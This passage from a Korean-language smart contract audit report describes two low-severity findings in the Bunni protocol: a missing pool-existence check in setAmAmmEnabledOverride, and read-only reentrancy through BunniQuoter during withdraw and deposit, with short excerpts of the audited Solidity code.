    }
```

# [L-12] `setAmAmmEnabledOverride()`에 풀 존재 확인 누락

`BunniHook::setAmAmmEnabledOverride` 함수를 사용하면 풀이 실제로 존재하는지 확인하지 않고 풀의 amAmm 가용성에 대한 재정의를 설정할 수 있습니다. 이로 인해 존재하지 않는 풀에 대해 재정의가 설정되어 프로토콜에 혼란과 잠재적인 잘못된 구성을 초래할 수 있습니다.

```solidity
File: BunniHook.sol
267:     function setAmAmmEnabledOverride(PoolId id, BoolOverride boolOverride) external onlyOwner {
268:         amAmmEnabledOverride[id] = boolOverride;
269:         emit SetAmAmmEnabledOverride(id, boolOverride);
270:     }
```

소유자는 `BunniHook::setAmAmmEnabledOverride`를 통해 풀을 활성화할 수 있으며, `BunniHook::getAmAmmEnabled` 함수는 풀이 존재하지 않을 때도 true를 반환합니다. 이 함수는 `external`이므로 이 함수를 사용하는 사람들에게 불일치를 일으킬 수 있습니다.

```solidity
File: BunniHook.sol
340:     function getAmAmmEnabled(PoolId id) external view override returns (bool) {
341:         return _amAmmEnabled(id);
342:     }
```

이 문제를 완화하려면 재정의 설정을 허용하기 전에 풀이 존재하는지 확인하는 검사를 구현하는 것이 좋습니다.

# [L-13] `withdraw()` 및 `deposit()`에서의 읽기 전용 재진입(Read-only reentrancy)

인출 및 입금 중 BunniHub 계약에서 로직 코드는 해당 특정 풀에 대한 계약 상태가 올바르지 않은 동안 볼트 및 토큰에 대한 많은 외부 호출을 수행합니다. BunniHub의 대부분의 함수에는 재진입 보호 기능이 있지만, 문제는 풀에 대한 작업을 미리 보는 데 뷰 계약으로 사용되는 BunniQuoter가 외부 호출 중에 호출될 수 있으며 해당 풀에 대한 계약 상태가 잘못되었기 때문에 결과도 잘못된다는 것입니다. 공격자는 이 문제를 이용하여 Bunni 프로토콜 위에 구축되고 BunniQuoter의 반환 값에 의존하는 다른 프로토콜을 공격할 수 있습니다.
